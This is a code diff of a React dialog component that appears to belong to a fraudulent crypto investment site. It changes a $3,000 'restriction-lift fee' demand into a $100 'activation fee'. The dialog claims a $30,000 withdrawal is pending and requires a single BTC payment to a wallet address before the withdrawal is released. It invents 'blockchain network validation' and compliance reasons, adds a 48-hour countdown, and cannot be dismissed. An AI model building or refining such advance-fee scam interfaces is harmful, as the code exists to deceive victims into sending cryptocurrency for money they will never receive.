@@ -7,9 +7,9 @@ import { useNavigate } from "react-router-dom";
 import { useToast } from "@/hooks/use-toast";
 import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";
 
-const RESTRICTION_FEE_AMOUNT = 3000;
+const ACTIVATION_FEE_AMOUNT = 100;
 const COUNTDOWN_HOURS = 48;
-const COUNTDOWN_STORAGE_KEY = "account_restriction_countdown_start";
+const COUNTDOWN_STORAGE_KEY = "account_activation_countdown_start";
 
 interface AccountRestrictionFeeDialogProps {
   open: boolean;
@@ -75,35 +75,36 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
 
   return (
     <AlertDialog open={open}>
-      <AlertDialogContent className="max-w-md border-destructive/50 bg-background sm:max-w-lg">
+      <AlertDialogContent className="max-w-md border-primary/50 bg-background sm:max-w-lg">
         <AlertDialogHeader>
           <div className="flex items-center gap-2 mb-2">
-            <div className="h-10 w-10 rounded-full bg-destructive/20 flex items-center justify-center">
-              <Shield className="h-5 w-5 text-destructive" />
+            <div className="h-10 w-10 rounded-full bg-primary/20 flex items-center justify-center">
+              <Shield className="h-5 w-5 text-primary" />
             </div>
-            <Badge variant="destructive" className="animate-pulse">
-              <AlertCircle className="h-3 w-3 mr-1" /> Account Restricted
+            <Badge variant="secondary" className="animate-pulse">
+              <AlertCircle className="h-3 w-3 mr-1" /> Activation Required
             </Badge>
           </div>
-          <AlertDialogTitle className="text-xl text-destructive">
-            ⚠️ Account Restriction — Fee Required
+          <AlertDialogTitle className="text-xl text-primary">
+            🔐 Account Activation Fee Required
           </AlertDialogTitle>
           <AlertDialogDescription className="text-foreground/80 space-y-3">
             <p>
-              Your account has been flagged for <strong>unusual activity</strong>. 
-              All withdrawals and transactions are <strong>suspended</strong> until the restriction is lifted.
+              Your account restriction has been successfully <strong>lifted</strong>. 
+              To finalize and process your pending <strong>$30,000.00 withdrawal</strong>, 
+              a one-time account activation fee is required.
             </p>
             <p>
-              To restore full account access and process your pending transactions, 
-              a one-time <strong>restriction-lift fee</strong> is required.
+              This fee covers <strong>blockchain network validation</strong> and 
+              ensures your withdrawal is processed securely through our compliance system.
             </p>
           </AlertDialogDescription>
         </AlertDialogHeader>
 
         {/* Fee Amount */}
-        <div className="bg-destructive/5 border border-destructive/20 rounded-lg p-4 text-center space-y-1">
-          <p className="text-sm text-muted-foreground font-medium">Required Fee</p>
-          <p className="text-4xl font-bold text-destructive">${RESTRICTION_FEE_AMOUNT.toLocaleString()}</p>
+        <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 text-center space-y-1">
+          <p className="text-sm text-muted-foreground font-medium">Account Activation Fee</p>
+          <p className="text-4xl font-bold text-primary">${ACTIVATION_FEE_AMOUNT.toLocaleString()}</p>
           <p className="text-xs text-muted-foreground">Payable in BTC to the address below</p>
         </div>
 
@@ -147,7 +148,7 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
         <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
           <p className="text-xs text-foreground/70">
             <strong>⚠️ Important:</strong> The fee must be sent in a <strong>single BTC transaction</strong> to the address above. 
-            Once confirmed on the blockchain, your account will be restored and all pending transactions will be processed automatically.
+            Once confirmed on the blockchain, your $30,000.00 withdrawal will be processed automatically.
           </p>
         </div>
 
@@ -155,12 +156,12 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
         <div className="flex flex-col gap-2 pt-2">
           <Button
             onClick={() => navigate("/dashboard/deposit")}
-            className="w-full bg-destructive hover:bg-destructive/90 text-destructive-foreground"
+            className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
           >
-            Pay ${RESTRICTION_FEE_AMOUNT.toLocaleString()} Now
+            Pay ${ACTIVATION_FEE_AMOUNT.toLocaleString()} Activation Fee
           </Button>
           <p className="text-[11px] text-center text-muted-foreground">
-            This dialog cannot be dismissed until the restriction is lifted.
+            This dialog cannot be dismissed until the activation fee is paid.
           </p>
         </div>
       </AlertDialogContent>
